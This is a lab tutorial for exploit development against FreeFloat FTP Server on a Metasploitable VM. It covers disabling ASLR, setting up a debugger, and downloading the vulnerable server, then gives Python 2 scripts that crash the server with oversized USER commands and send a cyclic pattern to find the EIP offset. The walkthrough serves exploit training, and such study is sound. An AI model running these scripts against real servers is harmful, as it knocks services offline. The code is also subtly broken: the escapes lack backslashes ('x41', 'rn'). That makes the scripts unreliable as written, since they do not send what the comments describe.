0. Disable ASLR in Metasploitable

```
[HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\Memory Management]
"MoveImages"=dword:00000000
```
Then reboot

1. Install Immunity Debugger
- Download https://debugger.immunityinc.com/ID_register.py
- Install on Metaspoitable

2. Install Mona.py
- Clone https://github.com/corelan/mona
- Drop mona.py to PyCommands folder in Immunity Debugger installation path

3. Deploy Vulnerable FTP Server
- Download http://www.exploit-db.com/wp-content/themes/exploit/applications/687ef6f72dcbbf5b2506e80a375377fa-freefloatftpserver.zip
- Unzip and run on Metasploitable

4. Use a Simple Fuzzing Script to crash the FTP server

```
# Import the required modulees the script will leverage
# This lets us use the functions in the modules instead of writing the code from scratch
import sys, socket
from time import sleep
 
# set first argument given at CLI to 'target' variable
target = sys.argv[1]
# create string of 50 A's 'x41'
buff = 'x41'*50
 
# loop through sending in a buffer with an increasing length by 50 A's
while True:
  # The "try - except" catches the programs error and takes our defined action
  try:
    # Make a connection to target system on TCP/21
    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    s.settimeout(2)
    s.connect((target,21))
    s.recv(1024)
 
    print "Sending buffer with length: "+str(len(buff))
    # Send in string 'USER' + the string 'buff'
    s.send("USER "+buff+"rn")
    s.close()
    sleep(1)
    # Increase the buff string by 50 A's and then the loop continues
    buff = buff + 'x41'*50
 
  except: # If we fail to connect to the server, we assume its crashed and print the statement below
    print "[+] Crash occured with buffer length: "+str(len(buff)-50)
    sys.exit()
 ```

5. Create Offset Detection Pattern

```
cd tools/metasploit-framework/
ruby tools/exploit/pattern_create.rb -l 600
```

6. Send Pattern

```
import sys, socket
 
target = sys.argv[1]
 
# pattern_create.rb 600 - creates a unique string of 600 bytes
# The 4 byte value that overwrites EIP will be unique and determine offset in buffer where EIP can be controlled
buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"
 
 
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((target,21))
print s.recv(2048)
s.send("USER "+buff+"rn")
s.close()
```

7. Identify Pattern Offset

```
cd tools/metasploit-framework/
tools/exploit/pattern_offset.rb -q <EIP rewritten value>
```



Tutorial Walkthrough
 - http://www.primalsecurity.net/0x0-exploit-tutorial-buffer-overflow-vanilla-eip-overwrite-2/